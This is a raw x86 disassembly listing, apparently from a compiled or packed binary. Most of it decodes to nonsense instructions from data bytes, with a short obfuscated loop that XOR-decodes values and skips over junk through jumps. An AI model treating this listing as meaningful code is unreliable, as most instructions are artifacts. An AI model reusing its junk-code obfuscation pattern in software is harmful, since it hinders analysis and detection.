  4048bb:	cmp    esi,DWORD PTR [eax+ecx*4-0x7b125c33]
  4048c2:	popa   
  4048c3:	push   ds
  4048c4:	shr    DWORD PTR [ecx+0x6343907],0x26
  4048cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048cc:	rol    DWORD PTR [ecx-0x6dac6416],cl
  4048d2:	shl    BYTE PTR [eax+eax*8+0x649f8d03],cl
  4048d9:	jecxz  0x4048a6
  4048db:	aas    
  4048dc:	not    ah
  4048de:	adc    eax,0x14dec27c
  4048e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e4:	add    BYTE PTR [ebx+0x576941dc],bh
  4048ea:	sahf   
  4048eb:	xchg   ecx,edx
  4048ed:	outs   dx,DWORD PTR ds:[esi]
  4048ee:	data16 adc ch,BYTE PTR ds:0xc19fc704
  4048f5:	sbb    ecx,esp
  4048f7:	mov    dh,0x8a
  4048f9:	add    edx,DWORD PTR [ecx-0x79]
  4048fc:	mov    bl,BYTE PTR [ecx-0x51]
  4048ff:	fcmovu st,st(6)
  404901:	sub    ecx,DWORD PTR [ebx-0x1ec96893]
  404907:	enter  0x5dd7,0xfd
  40490b:	adc    dl,BYTE PTR [esp+ebp*1-0x13]
  40490f:	enter  0x6d95,0x56
  404913:	adc    BYTE PTR [ecx],cl
  404915:	mov    eax,DWORD PTR ss:[ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	jle    0x404a2a
  4049bd:	outs   dx,BYTE PTR ds:[esi]
  4049be:	xor    cl,cl
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xdc70707d
  4049c8:	mov    bh,0x3b
  4049ca:	call   0xa24f:0xc17c1bd5
  4049d1:	pop    ds
  4049d2:	xchg   DWORD PTR [edi+0x2f5434d1],esp
  4049d8:	mov    WORD PTR ds:0xf6debf60,?
  4049de:	and    eax,0xcbeba0be
  4049e3:	icebp  
  4049e4:	dec    esp
  4049e5:	mov    al,ds:0xea58ad23
  4049ea:	push   0xffffff9c
  4049ec:	cld    
  4049ed:	shr    BYTE PTR [edx-0x17],0xcd
  4049f1:	jmp    0x7a86:0xe50b625e
  4049f8:	push   eax
  4049f9:	pop    edx
  4049fa:	nop
  4049fb:	mov    edx,0x5ab0e7f3
  404a00:	jl     0x4049e4
  404a02:	xchg   ebx,edx
  404a04:	stos   BYTE PTR es:[edi],al
  404a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a06:	(bad)  
  404a07:	pop    ds
  404a08:	add    al,0xf8
  404a0a:	lock pop ecx
  404a0c:	push   edx
  404a0d:	jecxz  0x404a38
  404a0f:	out    dx,al
  404a10:	dec    ebp
  404a11:	cmc    
  404a12:	popf   
  404a13:	mov    BYTE PTR [eax+0x25325dfc],dh
  404a19:	push   esi
  404a1a:	int    0xac
  404a1c:	lock addr16 xor al,0x5c
  404a20:	jne    0x404a36
  404a22:	lock pop ebx
  404a24:	nop
  404a25:	imul   esp,DWORD PTR [esi],0x17
  404a28:	mov    ah,ch
  404a2a:	lods   al,BYTE PTR ds:[esi]
  404a2b:	jmp    0xcea74beb
  404a30:	ins    DWORD PTR es:[edi],dx
  404a31:	cmp    ah,BYTE PTR [edi]
  404a33:	xor    BYTE PTR ds:0x46e0e0a2,cl
  404a39:	dec    ecx
  404a3a:	ja     0x404a1b
  404a3c:	out    dx,eax
  404a3d:	and    ebx,edx
  404a3f:	in     eax,0xd
  404a41:	ror    DWORD PTR [ebx+0x52],cl
  404a44:	scas   al,BYTE PTR es:[edi]
  404a45:	add    eax,0xec8db0c8
  404a4a:	stos   BYTE PTR es:[edi],al
  404a4b:	mov    BYTE PTR [edi+0x16],cl
  404a4e:	out    dx,eax
  404a4f:	push   ebp
  404a50:	adc    al,BYTE PTR [ebx+eiz*4+0x56]
  404a54:	stc    
  404a55:	ds nop
  404a57:	test   eax,0xedfb2acd
  404a5c:	ds dec esp
  404a5e:	lds    eax,FWORD PTR [edi-0x57]
  404a61:	dec    edi
  404a62:	pop    ebp
  404a63:	push   cs
  404a64:	and    al,0x0
  404a66:	mov    ah,0xa1
  404a68:	inc    eax
  404a69:	inc    ecx
  404a6a:	out    0xb2,eax
  404a6c:	cmc    
  404a6d:	pop    eax
  404a6e:	ds cwde 
  404a70:	clc    
  404a71:	inc    ebp
  404a72:	cmp    DWORD PTR [eax+0x67],esp
  404a75:	cmp    al,0x37
  404a77:	mov    ds:0x4b345f6d,eax
  404a7c:	frstor [ecx-0x2ed60b89]
  404a82:	repz clc 
  404a84:	add    eax,0x74e97a3a
  404a89:	dec    esi
  404a8a:	mul    bh
  404a8c:	cmp    BYTE PTR [eax],al
  404a8e:	into   
  404a8f:	mov    esp,0x447985ed
  404a94:	gs jnp 0x404a4b
  404a97:	in     eax,dx
  404a98:	xchg   edx,eax
  404a99:	cdq    
  404a9a:	lahf   
  404a9b:	xor    al,0x8f
  404a9d:	ins    DWORD PTR es:[edi],dx
  404a9e:	stos   BYTE PTR es:[edi],al
  404a9f:	xor    eax,0x92351e07
  404aa4:	dec    esp
  404aa5:	jo     0x404acb
  404aa7:	xor    eax,0x4e38af00
  404aac:	mov    ecx,0xb9992ea0
  404ab1:	push   ebx
  404ab2:	mov    ecx,0x53331ef4
  404ab7:	icebp  
  404ab8:	xchg   ebp,eax
  404ab9:	inc    eax
  404aba:	lea    ecx,[edx-0x69507d68]
  404ac0:	push   esp
  404ac1:	dec    ecx
  404ac2:	dec    ebx
  404ac3:	loop   0x404a60
  404ac5:	aaa    
  404ac6:	dec    esi
  404ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac8:	or     ch,BYTE PTR [edi-0x205549e7]
  404ace:	xor    edx,esi
  404ad0:	sbb    ecx,DWORD PTR [edi+0x1e]
  404ad3:	push   ss
  404ad4:	out    dx,al
  404ad5:	mov    ebp,0x53f576b3
  404ada:	ret    0x1e48
  404add:	test   BYTE PTR [esi],bh
  404adf:	out    dx,eax
  404ae0:	mov    eax,0x5f9aa64c
  404ae5:	rol    BYTE PTR [ecx],1
  404ae7:	loop   0x404b3b
  404ae9:	push   cs
  404aea:	shr    DWORD PTR [ebx+0x43],cl
  404aed:	pop    esi
  404aee:	or     ebx,esp
  404af0:	push   ebp
  404af1:	sbb    al,0x18
  404af3:	cmp    edx,ebx
  404af5:	jo     0x404aa5
  404af7:	retf   0x2c52
  404afa:	ja     0x404aa0
  404afc:	sti    
  404afd:	hlt    
  404afe:	in     eax,dx
  404aff:	xchg   BYTE PTR [ebp-0x11b5a8d7],bh
  404b05:	mov    edx,0xfb304f11
  404b0a:	adc    edi,DWORD PTR [esi+0x75b11f89]
  404b10:	cdq    
  404b11:	into   
  404b12:	push   0xa2e066a3
  404b17:	sbb    BYTE PTR [edx],ch
  404b19:	pop    ebp
  404b1a:	enter  0x191c,0x57
  404b1e:	mov    al,0x3f
  404b20:	mov    ebp,ebx
  404b22:	pop    edi
  404b23:	pop    esp
  404b24:	lods   al,BYTE PTR ds:[esi]
  404b25:	sbb    dh,BYTE PTR [edi+0x42]
  404b28:	addr16 in al,dx
  404b2a:	shr    BYTE PTR [eax-0x26],1
  404b2d:	pushf  
  404b2e:	push   ebp
  404b2f:	xor    bh,BYTE PTR [esi-0x474c8081]
  404b35:	jmp    0x1b1067c5
  404b3a:	adc    BYTE PTR [eax],bh
  404b3c:	pop    edi
  404b3d:	cmc    
  404b3e:	xlat   BYTE PTR ds:[ebx]
  404b3f:	push   0x9ef7fe33
  404b44:	or     DWORD PTR [ecx+0x4b],0x55
  404b48:	cmp    DWORD PTR ds:0x3a9a59d5,edi
  404b4e:	repnz aaa 
  404b50:	in     eax,dx
  404b51:	bound  esp,QWORD PTR [eax-0x105f777b]
  404b57:	jmp    0x8f5d:0xcc4a453e
  404b5e:	pop    edi
  404b5f:	in     al,0x12
  404b61:	jns    0x404b58
  404b63:	mov    al,0xda
  404b65:	xor    DWORD PTR [edi],edx
  404b67:	mov    al,ds:0xfac71b08
  404b6c:	xchg   BYTE PTR [ebx-0x17],dh
  404b6f:	dec    ebx
  404b70:	inc    ecx
  404b71:	cli    
  404b72:	mov    WORD PTR cs:[edx+0x6a613bc1],es
  404b79:	mov    esi,0xa3850147
  404b7e:	inc    ebx
  404b80:	stos   DWORD PTR es:[edi],eax
  404b81:	es inc ebp
  404b83:	ins    BYTE PTR es:[edi],dx
  404b84:	lods   eax,DWORD PTR ds:[esi]
  404b85:	ret    
  404b86:	pop    ecx
  404b87:	enter  0x76fe,0x6c
  404b8b:	(bad)  
  404b8c:	clc    
  404b8d:	lock fcom st(3)
  404b90:	sbb    BYTE PTR [edi],al
  404b92:	sub    DWORD PTR [edx+0x6e],edx
  404b95:	and    DWORD PTR [eax],ebp
  404b97:	test   edx,edx
  404b99:	(bad)
  404b9d:	int    0x5e
  404b9f:	mov    BYTE PTR [ecx],bl
  404ba1:	jmp    0xffaa5a7a
  404ba6:	xor    BYTE PTR [esi+0xf],bl
  404ba9:	mov    al,0x5d
  404bab:	jecxz  0x404c29
  404bad:	cmp    BYTE PTR [esi],ah
  404baf:	btc    DWORD PTR [esi],edi
  404bb2:	add    BYTE PTR [eax+eiz*8+0x3e],dl
  404bb6:	into   
  404bb7:	sub    BYTE PTR [esi],dh
  404bb9:	cmp    DWORD PTR [eax],ebp
  404bbb:	jnp    0x404c1a
  404bbd:	push   0x63
  404bbf:	mov    ch,cl
  404bc1:	pop    ss
  404bc2:	lahf   
  404bc3:	sti    
  404bc4:	icebp  
  404bc5:	fld    DWORD PTR [ebp-0x4f1457c1]
  404bcb:	pop    es
  404bcc:	mov    dh,BYTE PTR ds:0x3422ac19
  404bd2:	outs   dx,BYTE PTR ds:[esi]
  404bd3:	scas   al,BYTE PTR es:[edi]
  404bd4:	shl    BYTE PTR [eax+0x408ff7ab],cl
  404bda:	cmp    DWORD PTR [edi-0x45],edx
  404bdd:	sbb    al,0x21
  404bdf:	je     0x404c25
  404be1:	xor    al,0x88
  404be3:	cmp    eax,0x1fccf2e7
  404be8:	rcr    BYTE PTR [ecx-0x4b],cl
  404beb:	jl     0x404bb5
  404bed:	pop    eax
  404bee:	or     dl,ch
  404bf0:	xchg   DWORD PTR [eax+0x73],eax
  404bf3:	dec    edi
  404bf4:	xor    eax,0x1e8017a6
  404bf9:	sbb    eax,0x1487e70d
  404bfe:	clc    
  404bff:	lds    ebx,FWORD PTR [eax+0x36]
  404c02:	popa   
  404c03:	mul    dh
  404c05:	mov    ds:0x9f4de420,eax
  404c0a:	ror    BYTE PTR ds:0xef25931d,0x10
  404c11:	mov    BYTE PTR [ebx],0x4a
  404c14:	sbb    edx,ecx
  404c16:	jbe    0x404c71
  404c18:	imul   ecx,esi,0x14
  404c1b:	jle    0x404c92
  404c1d:	xchg   edx,eax
  404c1e:	loope  0x404baf
  404c20:	sbb    al,0x3a
  404c22:	sbb    BYTE PTR [ebp+0x44],bl
  404c25:	ret    
  404c26:	xor    DWORD PTR [esi],esi
  404c28:	mov    dh,BYTE PTR [edi]
  404c2a:	xchg   BYTE PTR [esi+0x1c51a40a],al
  404c30:	js     0x404c5b
  404c32:	icebp  
  404c33:	int3   
  404c34:	push   ebx
  404c35:	(bad)  
  404c36:	(bad)  
  404c37:	sub    DWORD PTR [ebx+0xdf30855],eax
  404c3d:	adc    edx,ebp
  404c3f:	pop    esi
  404c40:	mov    eax,ds:0x68b66eed
  404c45:	fs pop ds
  404c47:	std    
  404c48:	iret   
  404c49:	sub    al,0x8e
  404c4b:	pop    esp
  404c4c:	inc    eax
  404c4d:	xchg   ebx,eax
  404c4e:	dec    ecx
  404c4f:	xchg   BYTE PTR [esi+0x1505f102],al
  404c55:	sub    ah,BYTE PTR [esi-0x7f8e5d41]
  404c5b:	pop    ecx
  404c5c:	xchg   esp,eax
  404c5d:	pop    edi
  404c5e:	mov    ebp,0x9e103f54
  404c63:	cli    
  404c64:	out    0xc5,eax
  404c66:	pop    ds
  404c67:	aam    0x17
  404c69:	ja     0x404c60
  404c6b:	ds daa 
  404c6d:	stos   DWORD PTR es:[edi],eax
  404c6e:	js     0x404c69
  404c70:	mov    es,WORD PTR [ecx-0x32]
  404c73:	out    dx,eax
  404c74:	in     eax,0x57
  404c76:	loope  0x404c3a
  404c78:	jp     0x404c55
  404c7a:	sbb    eax,0xbec826d3
  404c7f:	icebp  
  404c80:	mov    edi,0xf66ff101
  404c85:	mov    edi,0x1a3de237
  404c8a:	mov    edi,0x68901bff
  404c8f:	mov    bh,0xb4
  404c91:	mov    esp,0xa1c789b6
  404c96:	outs   dx,BYTE PTR ds:[esi]
  404c97:	imul   esp,ebx,0xffffff87
  404c9a:	fs popf 
  404c9c:	and    edi,edi
  404c9e:	or     DWORD PTR [eax+0x1d97869a],ecx
  404ca4:	cwde   
  404ca5:	jae    0x404c48
  404ca7:	jns    0x404c34
  404ca9:	push   ss
  404caa:	cs jmp 0x404cdc
  404cad:	pop    ss
  404cae:	in     eax,dx
  404caf:	repz push edx
  404cb1:	enter  0x66ee,0x21
  404cb5:	sbb    ecx,DWORD PTR [ebx+0x70eeed3f]
  404cbb:	fs scas eax,DWORD PTR es:[edi]
  404cbd:	into   
  404cbe:	mov    BYTE PTR [edx+eiz*8+0x1c],0xd4
  404cc3:	sbb    bh,BYTE PTR [eax-0x11721502]
  404cc9:	(bad)  
  404cca:	push   edi
  404ccb:	xchg   esi,eax
  404ccc:	arpl   dx,si
  404cce:	mov    BYTE PTR ds:0xb83f2117,ah
  404cd4:	fild   QWORD PTR ds:0xfb6aab60
  404cda:	add    BYTE PTR [esi+0x2c3d47c1],dl
  404ce0:	lock jmp 0x404cdb
  404ce3:	call   0xab3247c7
  404ce8:	(bad)  
  404ce9:	test   DWORD PTR [edi-0x7f5cb97],ebp
  404cef:	test   DWORD PTR [edx],edx
  404cf1:	pop    eax
  404cf2:	ins    BYTE PTR es:[edi],dx
  404cf3:	(bad)  
  404cf4:	out    dx,al
  404cf5:	mov    esi,0xcd558df
  404cfa:	int    0xe0
  404cfc:	aaa    
  404cfd:	jnp    0x404d7e
  404cff:	adc    DWORD PTR [ebx-0x6161b700],ecx
  404d05:	jp     0x404ca9
  404d07:	mov    dl,0xca
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x4e]
  404d39:	sbb    DWORD PTR [edx],esi
  404d3b:	test   BYTE PTR [esi+0x3d70702e],dl
  404d41:	jge    0x404db3
  404d43:	jo     0x404d50
  404d45:	mov    ebp,0x2a961f7f
  404d4a:	add    DWORD PTR [esi-0x44],ebp
  404d4d:	adc    ebp,DWORD PTR ds:0xfd0ba4ea
  404d53:	aaa    
  404d54:	or     ecx,eax
  404d56:	ins    DWORD PTR es:[edi],dx
  404d57:	aas    
  404d58:	jo     0x404d60
  404d5a:	popa   
  404d5b:	fiadd  DWORD PTR [edx-0x2f]
  404d5e:	sub    dl,BYTE PTR [ecx-0x61483bf]
  404d64:	(bad)  
  404d65:	js     0x404db3
  404d67:	push   0x72a6d79
  404d6c:	lds    ecx,FWORD PTR [ebp-0x55]
  404d6f:	xor    DWORD PTR [ebp-0x6f81e69e],ebp
  404d75:	cmp    eax,0x8c0dc109
  404d7a:	jl     0x404d7e
  404d7c:	shl    DWORD PTR [ecx+edx*1+0x193638a1],0x10
  404d84:	pop    eax
  404d85:	sbb    dl,bh
  404d87:	loopne 0x404d99
  404d89:	fdivr  DWORD PTR [edi]
  404d8b:	pop    ebp
  404d8c:	push   ecx
  404d8d:	pop    ss
  404d8e:	sub    edi,esp
  404d90:	jbe    0x404d29
  404d92:	fnstenv [ebx]
  404d94:	retf   
  404d95:	inc    edx
  404d96:	inc    ecx
  404d97:	pop    edi
  404d98:	std    
  404d99:	fnsave [ecx+0x0]
  404d9c:	cmp    DWORD PTR [eax],ecx
  404d9e:	adc    edi,DWORD PTR [eax+0x383d2d7b]
  404da4:	xchg   ebp,eax
  404da5:	add    BYTE PTR [ebp-0x4c91e1d],bl
  404dab:	test   DWORD PTR [eax-0x153fbaad],0xbc47cc7e
  404db5:	xor    al,ah
  404db7:	push   ss
  404db8:	dec    ebp
  404db9:	xlat   BYTE PTR ds:[ebx]
  404dba:	inc    ebx
  404dbb:	cmp    ah,BYTE PTR [edx+0x29]
  404dbe:	dec    edx
  404dbf:	add    DWORD PTR [ecx],esp
  404dc1:	push   ebp
  404dc2:	mov    bh,0x7
  404dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dc5:	inc    ecx
  404dc6:	xchg   esi,eax
  404dc7:	fisubr WORD PTR [eax]
  404dc9:	out    0x4c,eax
  404dcb:	xor    DWORD PTR [eax-0x7e85e65],esp
  404dd1:	movnti DWORD PTR [esi+0x37465343],edx
  404dd8:	test   BYTE PTR [edi],0xd4
  404ddb:	push   ecx
  404ddc:	jno    0x404e01
  404dde:	dec    esp
  404ddf:	sbb    al,0x12
  404de1:	jle    0x404dc1
  404de3:	fdiv   DWORD PTR [esi-0x63]
  404de6:	cld    
  404de7:	jp     0x404e3e
  404de9:	pop    ebp
  404dea:	jl     0x404e33
  404dec:	pop    ecx
  404ded:	pop    es
  404dee:	stos   BYTE PTR es:[edi],al
  404def:	inc    ebx
  404df0:	cmp    eax,0x5fe66345
  404df5:	xchg   ecx,eax
  404df6:	pop    ecx
  404df7:	add    bl,BYTE PTR [edi+0x2ce198a9]
  404dfd:	inc    eax
  404dfe:	mov    BYTE PTR [ebx-0x8],bl
  404e01:	push   esp
  404e02:	sbb    DWORD PTR [ebp-0x62],0x5c3b42fa
  404e09:	mov    bl,0x80
  404e0b:	sbb    eax,0xd694d98e
  404e10:	xchg   edx,eax
  404e11:	int3   
  404e12:	add    eax,0xa480faae
  404e17:	dec    esi
  404e18:	stos   DWORD PTR es:[edi],eax
  404e19:	or     ebx,DWORD PTR [ebx+ebp*2+0x75]
  404e1d:	pop    esi
  404e1e:	push   ds
  404e1f:	sbb    ah,BYTE PTR [ecx-0x66]
  404e22:	popf   
  404e23:	ds pop edx
  404e25:	(bad)  
  404e26:	(bad)  
  404e27:	imul   edx,DWORD PTR [ebx+0xcf41b01],0x31
  404e2e:	xlat   BYTE PTR ds:[ebx]
  404e2f:	lock mov edi,0x54253654
  404e35:	adc    DWORD PTR [eax-0x63ac4909],edi
  404e3b:	add    dh,BYTE PTR [eax+0x49]
  404e3e:	test   BYTE PTR [ecx-0x2f8b6042],bh
  404e44:	lea    ebx,[esi-0x4a514bf6]
  404e4a:	(bad)  
  404e4b:	leave  
  404e4c:	sbb    DWORD PTR [edx],edx
  404e4e:	push   edi
  404e4f:	scas   al,BYTE PTR es:[edi]
  404e50:	push   ecx
  404e51:	mov    ds:0x80501a5,eax
  404e56:	dec    eax
  404e57:	pop    ss
  404e58:	push   ecx
  404e59:	fadd   st(1),st
  404e5b:	mov    eax,DWORD PTR [edi-0x78]
  404e5e:	inc    ebx
  404e5f:	pop    eax
  404e60:	xor    al,0x72
  404e62:	call   0x7df1:0x794b358
  404e69:	add    DWORD PTR [esi-0x66],eax
  404e6c:	bound  edi,QWORD PTR fs:[edi+edi*4+0x2101e5f3]
  404e74:	dec    eax
  404e75:	dec    edx
  404e76:	outs   dx,BYTE PTR ds:[esi]
  404e77:	sahf   
  404e78:	add    DWORD PTR [esi+0x559d26e1],edi
  404e7e:	add    dh,0xa
  404e81:	ins    DWORD PTR es:[edi],dx
  404e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e83:	clc    
  404e84:	pop    edi
  404e85:	pop    eax
  404e86:	adc    eax,0xc0e7cf02
  404e8b:	xchg   esi,eax
  404e8c:	and    al,BYTE PTR [esp+ebp*8+0x4b9f2d0]
  404e93:	cmp    eax,0x29237b50
  404e98:	dec    ecx
  404e99:	push   ebx
  404e9a:	mov    esp,0xd0fc5117
  404e9f:	mov    bh,BYTE PTR [ecx+ebp*8]
  404ea2:	test   eax,0x29700764
  404ea7:	dec    esi
  404ea8:	pop    esi
  404ea9:	retf   0x3af9
  404eac:	out    dx,al
  404ead:	sbb    DWORD PTR [esi-0x657ad8ca],ecx
  404eb3:	mov    ch,0xc1
  404eb5:	ror    BYTE PTR [ecx+0x639405a3],1
  404ebb:	dec    edi
  404ebc:	push   edi
  404ebd:	xchg   edx,edx
  404ebf:	cmp    edx,0xc5e3585a
  404ec5:	jo     0x404eca
  404ec7:	into   
  404ec8:	nop
  404ec9:	cmp    bl,ah
  404ecb:	ret    0xe345
  404ece:	das    
  404ecf:	ja     0x404e7a
  404ed1:	mov    ds:0xf77e0b79,al
  404ed6:	in     al,0xa7
  404ed8:	inc    edx
  404ed9:	cdq    
  404eda:	lahf   
  404edb:	imul   esi,DWORD PTR [edx],0xffffff95
  404ede:	push   esi
  404edf:	xchg   ebx,eax
  404ee0:	sub    edx,DWORD PTR [edx+0x213931dd]
  404ee6:	sub    al,0x88
  404ee8:	js     0x404f63
  404eea:	(bad)  
  404eeb:	cdq    
  404eec:	scas   al,BYTE PTR es:[edi]
  404eed:	xchg   ecx,eax
  404eee:	cmp    DWORD PTR [eax+0x2d93a814],ebp
  404ef4:	stc    
  404ef5:	sbb    bh,dl
  404ef7:	cmp    al,0x95
  404ef9:	fisubr WORD PTR [edi+0x32]
  404efc:	lea    edx,ds:0x92d69a75
  404f02:	mov    cl,al
  404f04:	and    ecx,DWORD PTR [ebx+0x33df2d70]
  404f0a:	addr16 jmp 0x6ed30079
  404f10:	(bad)
  404f13:	jecxz  0x404f4d
  404f15:	xor    ah,BYTE PTR [eax+0x30]
  404f18:	scas   al,BYTE PTR es:[edi]
  404f19:	aad    0xd3
  404f1b:	mov    cl,0x42
  404f1d:	sbb    BYTE PTR [edx],ah
  404f1f:	frstor [ebx+0x62821c9f]
  404f25:	xor    eax,edx
  404f27:	jne    0x404f68
  404f29:	fidiv  DWORD PTR [edx-0x50f3a43f]
  404f2f:	addr16 cwde 
  404f31:	sar    BYTE PTR [ebx+0x58],cl
  404f34:	leave  
  404f35:	cwde   
  404f36:	jnp    0x404ee7
  404f38:	and    eax,0xd0fb09dc
  404f3d:	inc    ebp
  404f3e:	pop    ecx
  404f3f:	push   es
  404f40:	cmp    ebp,DWORD PTR ss:[edi]
  404f43:	loope  0x404edf
  404f45:	sub    al,0x63
  404f47:	adc    eax,0x4d7005a6
  404f4c:	add    edi,ebp
  404f4e:	and    BYTE PTR [ebp-0x79],bh
  404f51:	loop   0x404f0b
  404f53:	(bad)  
  404f54:	cmp    bl,bl
  404f56:	das    
  404f57:	jno    0x404f65
  404f59:	out    0xc4,al
  404f5b:	or     esi,DWORD PTR [eax]
  404f5d:	fist   WORD PTR [ecx+0x5]
  404f60:	xchg   BYTE PTR [ebx+esi*1+0x4d],bl
  404f64:	mov    dh,0x71
  404f66:	dec    esp
  404f67:	retf   0x4eeb
  404f6a:	out    dx,eax
  404f6b:	ficomp DWORD PTR [edx]
  404f6d:	adc    DWORD PTR [ebp+0x33b290ec],0x9
  404f74:	dec    esi
  404f75:	jno    0x404f69
  404f77:	jbe    0x404f67
  404f79:	xchg   esp,eax
  404f7a:	sbb    eax,ecx
  404f7c:	lahf   
  404f7d:	jb     0x404f08
  404f7f:	mov    ebp,0xb9d3ca80
  404f84:	scas   al,BYTE PTR es:[edi]
  404f85:	mov    ah,BYTE PTR [ebx+eax*4+0x31]
  404f89:	jmp    0x2724c5a5
  404f8e:	shl    DWORD PTR [esi],1
  404f90:	pop    esp
  404f91:	rcr    DWORD PTR [edx+esi*4],0xfb
  404f95:	mov    bh,0xa5
  404f97:	pop    ebp
  404f98:	mov    eax,0x20d82b4
  404f9d:	sar    BYTE PTR [esi+0x6a],0xcb
  404fa1:	std    
  404fa2:	aaa    
  404fa3:	rcr    edx,0x50
  404fa6:	fist   WORD PTR [esp+esi*1]
  404fa9:	sub    al,0x1a
  404fab:	nop
  404fac:	mov    eax,0x54ed4b11
  404fb1:	imul   ebp,DWORD PTR [eax+0x1b21a6c1],0x3b
  404fb8:	pop    edx
  404fb9:	enter  0x26f4,0x66
  404fbd:	dec    eax
  404fbe:	ds inc ebp
  404fc0:	jns    0x405001
  404fc2:	jle    0x405022
  404fc4:	cmp    al,0xb4
  404fc6:	jg     0x404f7e
  404fc8:	mov    eax,ds:0xa50ed9f3
  404fcd:	into   
  404fce:	scas   al,BYTE PTR es:[edi]
  404fcf:	mov    dl,0xb
  404fd1:	out    0x3,eax
  404fd3:	push   esp
  404fd4:	bound  eax,QWORD PTR [edi]
  404fd6:	sub    bl,BYTE PTR [eax-0xb]
  404fd9:	cld    
  404fda:	adc    edi,DWORD PTR [ebp-0x47cc2128]
  404fe0:	add    bl,BYTE PTR [ebx]
  404fe2:	dec    edi
  404fe3:	push   edi
  404fe4:	int    0xca
  404fe6:	out    0x3,eax
  404fe8:	test   BYTE PTR [edi-0x1062439],dh
  404fee:	out    0x6c,al
  404ff0:	rol    BYTE PTR [edi],0xe2
  404ff3:	sbb    al,BYTE PTR [edi+edx*2-0x4e]
  404ff7:	pop    es
  404ff8:	in     al,0x7c
  404ffa:	push   0xd
  404ffc:	xor    DWORD PTR [si],esi
  404fff:	loop   0x404ff8
  405001:	ja     0x405040
  405003:	add    bh,BYTE PTR [edx]
  405005:	test   al,0xed
  405008:	sti    
  405009:	mov    ebp,0xbdabf4f3
  40500e:	sar    DWORD PTR [eax],0x98
  405011:	lock mov edx,0xcd854a1a
  405017:	imul   ecx,DWORD PTR [eax+ecx*4-0x3],0x6a8f1e7f
  40501f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405020:	aas    
  405021:	mov    eax,ds:0xac5b76c
  405026:	sub    al,0xb1
  405028:	mov    DWORD PTR [edi+ebp*1],0x4188d47b
  40502f:	adc    al,BYTE PTR [esi-0x5d]
  405032:	and    eax,edx
  405034:	stos   BYTE PTR es:[edi],al
  405035:	mov    WORD PTR [edx+0x38],?
  405038:	mov    al,ds:0x4ed217cb
  40503d:	push   ebx
  40503e:	or     esi,DWORD PTR [edi]
  405040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405041:	(bad)  
  405042:	jo     0x405069
  405044:	gs adc al,0x60
  405047:	cmp    dh,BYTE PTR [ebp+0x16436aaa]
  40504d:	push   esi
  40504e:	loop   0x405038
  405050:	fucom  st(6)
  405052:	pop    ss
  405053:	sub    al,0x7f
  405055:	push   ebx
  405056:	mov    esp,0xf2b2d248
  40505b:	or     eax,0xb242bd92
  405060:	pop    ecx
  405061:	inc    esi
  405062:	mov    ds:0xce220ecd,eax
  405067:	mov    cl,0x32
  405069:	retf   0x4979
  40506c:	xchg   esi,eax
  40506d:	add    bh,BYTE PTR ds:0xdea44b7c
  405073:	and    dl,bl
  405075:	(bad)  
  405076:	xchg   ebx,eax
  405077:	xor    eax,0x617894fe
  40507c:	lds    esp,FWORD PTR [ebx-0x50488973]
  405082:	mov    al,ds:0xb23c494f
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
